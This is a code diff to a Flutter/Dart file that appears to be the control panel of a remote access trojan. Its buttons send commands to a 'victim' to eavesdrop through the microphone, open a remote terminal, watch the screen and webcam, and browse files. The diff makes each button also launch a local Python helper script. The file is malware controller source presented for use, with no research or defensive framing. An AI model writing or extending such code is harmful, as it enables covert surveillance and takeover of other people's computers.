@@ -6,6 +6,7 @@ import 'package:panel/core/providers/main_sockets.dart';
 import 'package:panel/product/enums/locale_enums.dart';
 import 'package:panel/product/models/victim_model.dart';
 import 'package:panel/view/home/viewmodel/home_viewmodel.dart';
+import 'package:url_launcher/url_launcher_string.dart';
 
 class HomeView extends ConsumerStatefulWidget {
   const HomeView({Key? key}) : super(key: key);
@@ -95,19 +96,39 @@ class _HomeViewState extends ConsumerState<HomeView> {
             children: [
               IconButton(
                   icon: const Icon(Icons.keyboard_voice),
-                  onPressed: () => victim.send("voice")),
+                  onPressed: () {
+                    victim.send("listen_voice");
+                    launchUrlString(
+                        "file:///C:/Users/ertu1/Desktop/blank/utils/listen_voice.py");
+                  }),
               IconButton(
                   icon: const Icon(Icons.terminal),
-                  onPressed: () => victim.send("terminal")),
+                  onPressed: () {
+                    victim.send("terminal");
+                    launchUrlString(
+                        "file:///C:/Users/ertu1/Desktop/blank/utils/terminal.py");
+                  }),
               IconButton(
                   icon: const Icon(Icons.desktop_windows),
-                  onPressed: () => victim.send("watch")),
+                  onPressed: () {
+                    victim.send("watch_screen");
+                    launchUrlString(
+                        "file:///C:/Users/ertu1/Desktop/blank/utils/watch_screen.py");
+                  }),
               IconButton(
                   icon: const Icon(Icons.folder),
-                  onPressed: () => victim.send("file_manager")),
+                  onPressed: () {
+                    victim.send("file_manager");
+                    launchUrlString(
+                        "file:///C:/Users/ertu1/Desktop/blank/utils/file_manager.py");
+                  }),
               IconButton(
                   icon: const Icon(Icons.camera_alt),
-                  onPressed: () => victim.send("camera")),
+                  onPressed: () {
+                    victim.send("watch_camera");
+                    launchUrlString(
+                        "file:///C:/Users/ertu1/Desktop/blank/utils/watch_camera.py");
+                  }),
               IconButton(
                   icon: const Icon(Icons.cancel),
                   onPressed: () => victim.send("exit")),
